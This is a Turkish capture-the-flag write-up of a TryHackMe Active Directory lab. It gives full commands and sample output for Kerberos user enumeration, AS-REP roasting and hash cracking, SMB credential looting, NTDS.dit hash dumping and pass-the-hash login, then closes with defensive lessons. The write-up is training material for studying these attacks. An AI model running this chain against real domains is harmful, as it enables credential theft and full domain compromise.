# TryHackMe - Attacktive Directory Çözümü

* **Oda Linki:** [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
* **Zorluk:** Medium
* **Etiketler:** `Active Directory`, `Windows`, `Kerberos`, `AS-REP Roasting`, `Pass-the-Hash`, `Secretsdump`, `SMB Enumeration`

---

## 🚀 Özet (Attack Flow)

Bu oda, Active Directory ortamlarında sıkça karşılaşılan zafiyetlerin sömürülmesi üzerine kurulu kapsamlı bir senaryodur. Saldırı süreci aşağıdaki adımları içermektedir:

1.  **Keşif:** `nmap` ile hedef sistemdeki AD servislerinin (Kerberos, LDAP, SMB vb.) tespiti ve domain adının öğrenilmesi.
2.  **Kullanıcı Tespiti:** `kerbrute` aracıyla, hesap kilitlemelerine neden olmadan geçerli kullanıcı adlarının listelenmesi.
3.  **İlk Erişim:** "Kerberos Pre-authentication" özelliği devre dışı bırakılmış bir kullanıcıya karşı **AS-REP Roasting** saldırısı yapılarak parola hash'inin ele geçirilmesi ve `hashcat` ile kırılması.
4.  **Yetki Yükseltme:** Elde edilen ilk kimlik bilgileriyle SMB paylaşımlarının taranması, zayıf izinlere sahip bir yedekleme dosyasından yeni ve daha yetkili bir kullanıcının kimlik bilgilerinin bulunması.
5.  **Domain Kontrolü:** "Backup Operators" grubunun özel yetkileri kullanılarak `secretsdump.py` ile **NTDS.dit** veritabanından tüm domain kullanıcılarının (Administrator dahil) NTLM hash'lerinin çekilmesi.
6.  **Kalıcı Erişim:** Administrator kullanıcısının NTLM hash'i ile **Pass-the-Hash (PtH)** saldırısı yapılarak `evil-winrm` üzerinden sisteme tam yetkili erişim sağlanması.

---

## ✍️ Detaylı Çözüm Adımları

### Adım 1: Keşif ve Bilgi Toplama (Reconnaissance)

Her sızma testinde olduğu gibi ilk adım, hedefi tanımaktır. Bu amaçla, hedef IP adresine kapsamlı bir `nmap` taraması gerçekleştirildi.

```bash
nmap -v -sS -A -T4 [HEDEF_IP]
```

Bu tarama, hedefin bir **Windows Active Directory Domain Controller** olduğunu açıkça ortaya koydu. Çıktıdaki en kritik bulgular ve anlamları şunlardı:

| Port | Servis | Anlamı ve Önemi |
| :--- | :--- | :--- |
| **88/tcp** | `kerberos-sec` | **Active Directory'nin Kalbi:** Kimlik doğrulama bu servis üzerinden yapılır. Kerberoasting gibi saldırılar için ana hedeftir. |
| **389/tcp** | `ldap` | **AD Adres Defteri:** Domain'deki kullanıcılar, gruplar ve objeler hakkında bilgi almak için sorgulanabilir. |
| **445/tcp** | `microsoft-ds` | **Dosya Paylaşım Kapısı (SMB):** Ağdaki paylaşımlara erişim, bilgi sızdırma ve yatay hareket için en kritik portlardan biridir. |
| **3389/tcp** | `ms-wbt-server` | **Uzak Masaüstü (RDP):** Geçerli bir kimlik bilgisi bulunduğunda sisteme tam grafiksel erişim sağlar. |
| **5985/tcp** | `WinRM` | **Uzaktan Yönetim:** PowerShell ile uzaktan komut çalıştırmayı sağlar. `evil-winrm` gibi araçlar bu portu hedefler. |

`nmap` çıktısı ayrıca bize domain adının **`spookysec.local`** olduğunu da söyledi. Bu ismin sistemimiz tarafından tanınabilmesi için yerel `/etc/hosts` dosyasına ilgili IP adresi ile birlikte eklendi.

```bash
# /etc/hosts dosyasına "nano /etc/hosts" komutuyla girilerek aşağıdaki satır eklendi.
# Bu işlem, "spookysec.local" yazdığımızda sistemin doğru IP'ye gitmesini sağlar.
[HEDEF_IP]    spookysec.local
```

### Adım 2: Kullanıcı Adı Tespiti (User Enumeration with Kerbrute)

Saldırının bir sonraki aşaması için geçerli kullanıcı adlarına ihtiyacımız var. Active Directory ortamlarında, yanlış parola denemeleri hesapların kilitlenmesine neden olabilir. Bu riski ortadan kaldıran `kerbrute` aracı, Kerberos'un bir özelliğinden faydalanarak hangi kullanıcıların sistemde var olduğunu güvenli bir şekilde tespit eder.

```bash
# kerbrute'un 'userenum' modülü ile, verilen listedeki kullanıcı adları domain'de sorgulandı.
kerbrute userenum --dc [HEDEF_IP] -d spookysec.local userlist.txt
```

Çıktı bize `svc-admin`, `backup`, `james`, `administrator` gibi saldırıda kullanabileceğimiz bir dizi geçerli kullanıcı adı verdi.

### Adım 3: İlk Erişim (Initial Access via AS-REP Roasting)

AS-REP Roasting, "Kerberos Ön Kimlik Doğrulaması" (Pre-authentication) gerektirmeyen kullanıcı hesaplarını hedef alan bir saldırıdır. Eğer bu özellik bir hesapta kapalıysa, herhangi biri o kullanıcı adına bir bilet talep edebilir ve sunucu, cevaben kullanıcının parolasıyla şifrelenmiş bir bilet parçası (TGT) gönderir. Bu, parolayı bilmeden parola hash'ini elde etmemizi sağlar.

`impacket` koleksiyonundan `GetNPUsers.py` script'i ile, `kerbrute` ile bulduğumuz kullanıcılar bu zafiyete karşı tarandı.

```bash
# -usersfile ile tüm geçerli kullanıcıların olduğu dosyayı verdik.
# -no-pass parametresi, ön kimlik kanıtı olmadan istek göndererek saldırıyı tetikler.
python3 GetNPUsers.py spookysec.local/ -usersfile valid_users.txt -no-pass -format hashcat
```

Araç, `svc-admin` kullanıcısının zafiyetli olduğunu tespit etti ve `hashcat`'in anlayacağı formatta parola hash'ini ekrana yazdırdı:

```text
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:885ab...[REDACTED]...
```

Bu hash, `hashcat`'in **mod 18200 (Kerberos 5, etype 23, AS-REP)** ile kırıldı.

```bash
hashcat -m 18200 passwordHash.txt passwordlist.txt
```
* **Kırılan Parola:** `[REDACTED]`
* **Ele Geçirilen Kimlik Bilgisi:** `svc-admin:[REDACTED]`

### Adım 4: SMB Paylaşımları Üzerinden Yetki Yükseltme

Artık ağda geçerli bir kullanıcımız var. Bu kullanıcının ne gibi yetkilere sahip olduğunu ve hangi dosyalara erişebildiğini anlamak için SMB paylaşımlarını kontrol ettik. `smbclient` aracı ile `svc-admin` olarak sunucudaki paylaşımlar listelendi.

```bash
# -L parametresi ile sunucudaki paylaşımları listeliyoruz.
smbclient -L //[HEDEF_IP] -U svc-admin
```

Listede `backup` adında bir paylaşım dikkat çekti. Bu paylaşıma bağlandık:

```bash
# Hedef IP ve paylaşım adını belirterek interaktif bir oturum başlattık.
smbclient \\\\\[HEDEF_IP]\\backup -U svc-admin
```

İçeride `ls` komutu ile `backup_credentials.txt` adında bir dosya bulundu. `more` komutu ile dosyanın içeriği okundu:

```text
smb: \> more backup_credentials.txt
[REDACTED_BASE64_STRING]
```

Bu metin, Base64 ile kodlanmış bir veridir. Çevrimiçi bir Base64 çözücü ile metni orijinal haline çevirdiğimizde, çok daha değerli bir kimlik bilgisi elde ettik:

* **Çözülmüş Metin:** `backup@spookysec.local:[REDACTED]`

### Adım 5: Domain Hash'lerinin Dökümü (Dumping NTDS.dit)

`backup` kullanıcısı, isminden de anlaşılacağı gibi muhtemelen "Backup Operators" grubunun bir üyesidir. Bu grup, Windows'ta `SeBackupPrivilege` adlı çok özel bir yetkiye sahiptir. Bu yetki, dosya izinlerini yok sayarak sistemdeki kilitli dosyalar dahil her şeyi okuma hakkı tanır.

Bu, bizim için altın bir fırsattır. Bu yetkiyi kullanarak, Active Directory'nin tüm parola hash'lerinin saklandığı `NTDS.dit` veritabanını okuyabiliriz. `impacket-secretsdump` bu iş için biçilmiş kaftandır.

```bash
# Bir önceki adımda bulunan backup kullanıcısının parolasıyla bağlanıyoruz.
python3 secretsdump.py backup@spookysec.local:'[REDACTED_PASSWORD]'
```

Komut başarıyla çalıştı ve **Administrator** dahil olmak üzere domain'deki **tüm kullanıcıların NTLM parola hash'lerini** ekrana döktü.

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e036321...[REDACTED]...b0bcb4fc:::
...
```
* **Ele Geçirilen Administrator NTLM Hash'i:** `0e036321...[REDACTED]...b0bcb4fc`

### Adım 6: Pass-the-Hash ile Domain Admin Erişimi

Artık en yetkili kullanıcının NTLM hash'ine sahibiz. Parolayı kırmakla zaman kaybetmek yerine, **Pass-the-Hash (PtH)** saldırısı ile bu hash'i doğrudan bir bilet gibi kullanarak kimlik doğrulaması yapabiliriz.

`evil-winrm` aracı, `-H` parametresi ile bu saldırıyı desteklemektedir.

```bash
evil-winrm -i [HEDEF_IP] -u Administrator -H '0e036321...[REDACTED]...b0bcb4fc'
```

**Sonuç:** Bu komut, hedef sunucuda `Administrator` yetkilerinde tam bir PowerShell komut satırı erişimi sağladı ve domain'in kontrolü tamamen ele geçirildi.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
nt authority\system
```

---

## 🛡️ Öğrenilenler ve Savunma Stratejileri

* **AS-REP Roasting'e Karşı Önlem:** Domain'deki tüm kullanıcı hesaplarında "Do not require Kerberos preauthentication" seçeneğinin **devre dışı bırakıldığından** emin olunmalıdır.
* **Zayıf İzinler:** Ağ paylaşımlarında asla hassas bilgiler (özellikle kimlik bilgileri) barındırılmamalıdır. Dosya ve klasör izinleri "en az yetki prensibine" göre sıkı bir şekilde yapılandırılmalıdır.
* **Servis Hesabı Güvenliği:** `backup` gibi servis hesaplarının yetkileri düzenli olarak denetlenmeli ve gereğinden fazla ayrıcalığa sahip olmaları engellenmelidir. `SeBackupPrivilege` gibi güçlü yetkilere sahip hesaplar yakından izlenmelidir.
* **Eski Protokolleri Devre Dışı Bırakma:** Güvenlik açıklarına yol açabilen LLMNR ve NBT-NS gibi eski protokoller, Group Policy üzerinden devre dışı bırakılmalıdır.
